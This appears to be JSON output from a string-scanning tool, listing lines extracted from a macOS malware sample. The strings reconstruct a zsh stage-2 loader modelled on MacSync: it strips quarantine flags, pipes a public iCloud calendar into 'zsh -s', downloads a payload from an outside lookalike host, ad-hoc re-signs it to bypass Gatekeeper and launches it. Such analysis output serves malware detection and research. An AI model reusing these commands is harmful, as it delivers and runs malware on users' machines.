  "text": {
    "ascii": [
      {
        "value": "#!/bin/zsh",
        "data_offset": 0,
        "data_len": 10,
        "method": "RawScan",
        "kind": null
      },
      {
        "value": "# Inspired by MacSync's stage-2 loader. It strips the quarantine attribute from",
        "data_offset": 11,
        "data_len": 79,
        "method": "RawScan",
        "kind": null
      },
      {
        "value": "# the launched bundle, fetches a public iCloud calendar, and pipes it into a",
        "data_offset": 91,
        "data_len": 76,
        "method": "RawScan",
        "kind": null
      },
      {
        "value": "# fresh shell interpreter reading from stdin (zsh -s). The interpreter ignores",
        "data_offset": 168,
        "data_len": 78,
        "method": "RawScan",
        "kind": null
      },
      {
        "value": "# the VCALENDAR syntax as invalid commands until it reaches the payload hidden",
        "data_offset": 247,
        "data_len": 78,
        "method": "RawScan",
        "kind": null
      },
      {
        "value": "# after the DESCRIPTION field -- a living-off-the-land delivery trick. The",
        "data_offset": 326,
        "data_len": 74,
        "method": "RawScan",
        "kind": null
      },
      {
        "value": "# payload then downloads a next-stage .app, unquarantines it, ad-hoc re-signs",
        "data_offset": 401,
        "data_len": 77,
        "method": "RawScan",
        "kind": null
      },
      {
        "value": "# it (Gatekeeper bypass), and launches it.",
        "data_offset": 479,
        "data_len": 42,
        "method": "RawScan",
        "kind": null
      },
      {
        "value": "xattr -cr \"$APP\"",
        "data_offset": 531,
        "data_len": 16,
        "method": "RawScan",
        "kind": null
      },
      {
        "value": "CAL_URL=\"https://caldav.icloud.com/published/2/MTk1NDMwMDMzNTUxOTU0M1aHCZ-nMxiyGzBTzPiodOf44DtKJ6PpjftAG28_ui2NCYMpL_vu4pF4ddsJ8ysg0QI7pR0VEIEbZYdilVZRw08\"",
        "data_offset": 549,
        "data_len": 155,
        "method": "RawScan",
        "kind": null
      },
      {
        "value": "curl -fsSL \"$CAL_URL\" -o /tmp/.calfetch.ics",
        "data_offset": 705,
        "data_len": 43,
        "method": "RawScan",
        "kind": "ShellCmd"
      },
      {
        "value": "cat /tmp/.calfetch.ics | zsh -s",
        "data_offset": 749,
        "data_len": 31,
        "method": "RawScan",
        "kind": "ShellCmd"
      },
      {
        "value": "# The commands the calendar DESCRIPTION drives on the victim:",
        "data_offset": 782,
        "data_len": 61,
        "method": "RawScan",
        "kind": null
      },
      {
        "value": "curl -fsSL \"https://docsend.appstore.com.mx/dcc737d157ef4271/stage2.enc\" -o /tmp/.sys-update.tar.gz",
        "data_offset": 844,
        "data_len": 99,
        "method": "RawScan",
        "kind": "ShellCmd"
      },
      {
        "value": "tar -xzf /tmp/.sys-update.tar.gz -C /tmp",
        "data_offset": 944,
        "data_len": 40,
        "method": "RawScan",
        "kind": "ShellCmd"
      },
      {
        "value": "xattr -cr /tmp/.sys-update.app",
        "data_offset": 985,
        "data_len": 30,
        "method": "RawScan",
        "kind": null
      },
      {
        "value": "codesign --force --deep --sign - /tmp/.sys-update.app",
        "data_offset": 1016,
        "data_len": 53,
        "method": "RawScan",
        "kind": null
      },
      {
        "value": "open \"/tmp/.sys-update.app\"",
        "data_offset": 1070,
        "data_len": 27,
        "method": "RawScan",
        "kind": null
      }
    ],
